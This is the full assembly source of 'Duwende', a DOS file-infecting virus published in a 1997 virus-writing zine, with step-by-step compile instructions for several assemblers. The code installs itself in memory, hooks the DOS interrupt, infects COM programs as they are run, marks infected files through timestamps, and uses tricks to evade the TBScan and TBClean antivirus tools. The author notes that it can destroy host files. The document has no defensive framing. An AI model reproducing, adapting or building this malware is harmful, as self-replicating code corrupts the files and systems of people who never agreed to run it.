    ;---------------------------------------------------------------
    ; Hex-Files No. 1                                  December 1997
    ;===============================================================
    ;   Likhang Pilipino!   Ipinagmamalaki!   Gawa sa Pilipinas!
    ;===============================================================
    ;
    ;                   my program is short
    ;                   short really is a dwarf
    ;                   dwarf is called here duwende
    ;                   therefore my program is DUWENDE
    ;
    ; Virus : Duwende
    ; Author: Putoksa Kawayan
    ; Date  : March 15, 1997
    ; Origin: Metro Manila, Philippines
    ;
    ;===============================================================
    ;
    ; How to compile:
    ;
    ;  first. cut everything from the start of this file up to
    ;  the line that says "duwende.asm starts here".
    ;
    ;  next. goto end of file and cut everything starting from the
    ;  line that says "duwende.asm ends here" up to the end of the file.
    ;
    ;  then. save file as duwende.asm
    ;
    ;  finally. you need a compiler program. tasm and masm are
    ;  commercial. a86 is shareware, get a copy in internet. what
    ;  compiler you have, i dont know. so choose what is best for you.
    ;
    ;   tasm: (2.01)  tasm duwende.asm;
    ;                 tlink duwende.obj;
    ;                 exe2bin duwende.exe duwende.com
    ;
    ;                 ** tlink /t aint work because of org 0 **
    ;
    ;
    ;   masm: (5.00)  masm duwende.asm;
    ;                 link duwende.obj;
    ;                 exe2bin duwende.exe duwende.com
    ;
    ;         (6.00)  ml /AT /Zm duwende.asm
    ;
    ;
    ;   a86:  (4.02)  a86 duwende.asm duwende.com
    ;
    ;         (2.16)  a86 duwende.asm TO duwende.com
    ;
    ;                 ** requires minor code fixing. see end of listing **
    ;
    ;
    ;  lastly. this is virii you know. this virii is tame and lame but
    ;  makes problem. _watch_out_any_hows_ :)
    ;
    ;---------------------------------------------------------------
                                                ;
    _my_program segment para 'code'             ;
    assume cs:_my_program,ds:_my_program        ;
                                                ;
    ;---------------------------------------------------------------
                                                ; structure of dos dta
    dta     struc                               ;
    _jmp1   db      ?                           ; drive number -> A=01,B=02,...
    _jmp2   dw      ?           ;11 dup (?)     ; 11 byte search mask
            db      18 dup (?)                  ; reserved -> for next search
    _attr   db      ?                           ; attribute
    _time   dw      ?                           ; time stamp
    _date   dw      ?                           ; date stamp
    _len    dw      ?                           ; length low order
    _asciiz dw      ?                           ; length high order
    namext  db      13 dup (0)                  ; file name
    dta     ends                                ;
                                                ;
    ;---------------------------------------------------------------
                                                ;
    codlen  equ     ((_finis-_is_me)+31)/16     ; memory required in para
                                                ;
    ;---------------------------------------------------------------
                                                ;
    org 0                                       ;
                                                ;
    _is_me: call    $+3                         ; welcome to my virii
            cld                                 ;
                                                ;
    ;---------------------------------------------------------------
                                                ; memry selfrec :< :( :) :>
            mov     al,-1                       ; check: ax = dx = 0xffff
            mov     bp,100h                     ;
            cbw                                 ;
            cwd                                 ; hide undocumented dos from
            int     21h                         ;    tbscan
            cmp     al,dl                       ; if memry resident
                                                ;    ax = 0xff00 dx = 0
    ;---------------------------------------------------------------
            pop     si                          ; get start offset + 3
            je      _01                         ;
    ;---------------------------------------------------------------
            sub     di,di                       ; not resident
            mov     ax,es                       ;
            dec     ax                          ;
            mov     ds,ax                       ;
            mov     bx,[di+3]                   ; get mcb length
            mov     cx,codlen                   ;
            sub     bx,cx                       ;
            push    cx                          ;
            mov     ah,4ah                      ; release some memory
            int     21h                         ;
            mov     cl,8                        ;
            pop     bx                          ;
            dec     bx                          ;
            mov     ah,48h                      ; alocate memory
            int     21h                         ;
            push    ax                          ;
            mov     es,ax                       ;
            dec     ax                          ;
            push    cx                          ;
            mov     [di+18],ax                  ; reset top mem
            mov     ds,ax                       ;
            pop     [di+1]                      ; set mcb owner to dos
    ;---------------------------------------------------------------
            push    cs                          ;
            pop     ds                          ;
            push    si                          ; save start of virii
            sub     si,3                        ;
            mov     cx,offset _me_dta           ; copy virii code to
            repe movsb                          ; mem top
            pop     si                          ;
            pop     ds                          ;
    ;---------------------------------------------------------------
            mov     ax,3521h                    ;
            int     21h                         ; save old dos int
            mov     _off,bx                     ;
            mov     _seg,es                     ;
    ;---------------------------------------------------------------
            mov     ah,25h                      ;
            mov     dx,offset _is_dos           ; set up own dos int
            int     21h                         ;
    ;---------------------------------------------------------------
            push    cs                          ;
            pop     ds                          ; reset segments
            push    cs                          ;
            pop     es                          ;
    ;---------------------------------------------------------------
    _01:    add     si,offset _save-3           ; return overwritten victim
    _02:    mov     di,0                        ; code and execute victim
            add     di,bp                       ; from there. this will make
            push    di                          ; generic cleaner inutile
            movsb                               ;    esp tbclean
            movsw                               ;
            ret                                 ; execute victim
                                                ;
    ;---------------------------------------------------------------
    ;
    ;===============================================================
                                                ;>                 <
            db      'Duwende'                   ;> *program name*  <
                                                ;>                 <
    ;===============================================================
    ;
    ;---------------------------------------------------------------
                                                ; my dos int handler
    _is_dos:pushf                               ;
            cmp     ah,4bh                      ; only infects on
            je      _05                         ; program load
    ;---------------------------------------------------------------
            cmp     ax,-1                       ; my resident id?
            je      _04                         ;
    ;---------------------------------------------------------------
    _03:    popf                                ; execute old dos handler
            db      0eah                        ;
    _off    dw      ?                           ;
    _seg    dw      ?                           ;
    ;---------------------------------------------------------------
    _04:    inc     dx                          ; set dx = 0  al = 0
            popf                                ; resident ID
    ;---------------------------------------------------------------
                                                ; my error int handle
    _is_err:mov     al,0                        ;
            iret                                ;
    ;---------------------------------------------------------------
    _who_me:and [bx+si+75h],dl                  ; no one else but me!!!!
            jz $+71h                            ;
            db 6bh                              ;  :)
            jnb $+63h                           ;
            and [bp+di+61h],cl                  ; <--- this compile ok
            ja $+63h                            ;    in tasm and masm
            jns $+63h                           ;    but not in old a86
            db 6eh                              ;
    ;---------------------------------------------------------------
    _05:    push    ax                          ; save registers used
            push    cx                          ;
            push    dx                          ;
            push    bx                          ;
            push    si                          ;
            push    ds                          ;
            push    es                          ;
    ;---------------------------------------------------------------
            mov     ah,2fh                      ; save active dta
            int     21h                         ;
            push    es                          ;
            push    bx                          ;
    ;---------------------------------------------------------------
            push    ds                          ; save victim
            push    dx                          ;
    ;---------------------------------------------------------------
            push    cs                          ;
            pop     ds                          ;
            mov     dx,offset _me_dta           ; set virii dta
            mov     ah,1ah                      ;
            int     21h                         ;
    ;---------------------------------------------------------------
            mov     si,dx                       ; init pointer
    ;---------------------------------------------------------------
            pop     dx                          ; get victim
            pop     ds                          ;
    ;---------------------------------------------------------------
            mov     ah,4eh                      ; dos find file gives you
            mov     cx,27h                      ; drive:attrib:size:date:time
            int     21h                         ; also caps filename
    ;---------------------------------------------------------------
            jc      _07                         ;
            push    cs                          ; selfrec on file :>
            pop     ds                          ;
            mov     al,byte ptr [si]._time      ; infect check
            mov     ah,byte ptr [si]._date      ;
            mov     dl,1fh                      ;
            and     al,dl                       ;
            jz      _06                         ; sec = 0 ==> not infected
            and     ah,dl                       ;
            cmp     al,ah                       ; day <> sec ==> not infected
            je      _07                         ; day = sec ==> infected
    ;---------------------------------------------------------------
    _06:    mov     al,[si]._jmp1               ; get drive number
            add     al,'A'-1                    ;
            mov     ah,':'                      ;
            mov     [si]._asciiz,ax             ; set up asciiz
    ;---------------------------------------------------------------
            call    _inf                        ;; *my life giver* ;;;
    ;---------------------------------------------------------------
    _07:    pop     dx                          ;
            pop     ds                          ; restore active dta
            mov     ah,1ah                      ;
            int     21h                         ;
    ;---------------------------------------------------------------
            pop     es                          ; restore registers
            pop     ds                          ;
            pop     si                          ;
            pop     bx                          ;
            pop     dx                          ;
            pop     cx                          ;
            pop     ax                          ;
            jmp     _03                         ; done!!!!
                                                ;
    ;---------------------------------------------------------------
    ;---------------------------------------------------------------
    _inf:   mov     ax,3524h                    ; save error int
            int     21h                         ;
            push    es                          ;
            push    bx                          ;
    ;---------------------------------------------------------------
            mov     ah,25h                      ; set up own error int
            mov     dx,offset _is_err           ;
            push    ax                          ;
            int     21h                         ;
    ;---------------------------------------------------------------
            lea     dx,[si]._asciiz             ; clear attrib
            xor     cx,cx                       ;
            mov     ax,4301h                    ;
            int     21h                         ;
            jc      _08                         ; write protected?
            push    dx                          ;
            call    _10                         ;
    ;---------------------------------------------------------------
            pop     dx                          ;
            xor     ch,ch                       ;
            mov     cl,[si]._attr               ; restore attrib
            mov     ax,4301h                    ;
            int     21h                         ;
    ;---------------------------------------------------------------
    _08:    pop     ax                          ;
            pop     dx                          ; restore old error int
            pop     ds                          ;
            int     21h                         ;
    ;---------------------------------------------------------------
    _09:    ret                                 ;
                                                ;
    ;---------------------------------------------------------------
    ;---------------------------------------------------------------
    _10:    mov     ax,3d02h                    ; open victim
            int     21h                         ;
            jc      _09                         ;
            xchg    bx,ax                       ; save file handle
    ;---------------------------------------------------------------
            mov     ah,3fh                      ; read 3 bites from
            mov     cx,3                        ; victim start
            lea     dx,[si-3]                   ;
            int     21h                         ;
    ;---------------------------------------------------------------
            mov     ax,[si-3]                   ;
            cmp     al,0e9h                     ; is it a jmp e9?
            jne     _11                         ; infect near jmp only
    ;---------------------------------------------------------------
            mov     dx,[si-2]                   ;
            add     dx,cx                       ;
            mov     cl,0                        ; compute where to write
            mov     ax,4200h                    ; jmp to virii
            push    ax                          ;
            push    cx                          ; save offsets for write
            push    dx                          ;
            int     21h                         ;
                                                ;
    ;---------------------------------------------------------------
            mov     word ptr ds:_02+1,ax        ;
            push    ax                          ; save 3 bites from
            mov     ah,3fh                      ; middle of victim
            lea     dx,[si-3]                   ;
            mov     cl,3                        ;
            int     21h                         ;
    ;---------------------------------------------------------------
            pop     dx                          ;
            mov     ax,[si]._len                ; set up jump to virii
            sub     ax,cx                       ;
            sub     ax,dx                       ;
            mov     [si]._jmp1,0e9h             ;
            mov     [si]._jmp2,ax               ;
            pop     dx                          ;
            pop     cx                          ;
            pop     ax                          ;
            push    ax                          ;
            push    cx                          ;
            int     21h                         ;
            mov     dx,si                       ; write jmp in the middle
            mov     cl,3                        ; of the file
            mov     ah,40h                      ;
            int     21h                         ;
    ;---------------------------------------------------------------
            pop     cx                          ; write _my_program
            pop     ax                          ; to end of victim
            mov     dx,[si]._len                ;
            int     21h                         ; DUWENDE destroys
            mov     cx,si                       ; victim if disk is full
            mov     ah,40h                      ; i do not check
            int     21h                         ; error :(
    ;---------------------------------------------------------------
            mov     ax,[si]._date               ;
            mov     cx,[si]._time               ;
            mov     dx,ax                       ; make second = day
            and     al,1fh                      ; file selfrec
            and     cl,0e0h                     ;
            or      cl,al                       ;
            mov     ax,5701h                    ;
            int     21h                         ;
    ;---------------------------------------------------------------
    _11:    mov     ah,3eh                      ; done. close file
            int     21h                         ;
            ret                                 ;
    ;---------------------------------------------------------------
    _save   db      90h                         ; holds victims 3 bites
    _save1  dw      20cdh                       ;
                                                ; prog 1st gen init code:
                                                ;    90    nop
                                                ;    cd20  int 20h  end exec
    ;---------------------------------------------------------------
    _me_dta    db   43 dup (?)                  ; program dta
    ;---------------------------------------------------------------
                                                ;
    _finis:                                     ; end label
                                                ;
    _my_program ends                            ;
                                                ;
    end _is_me                                  ;
                                                ;  end _my_progam
    ;---------------------------------------------------------------
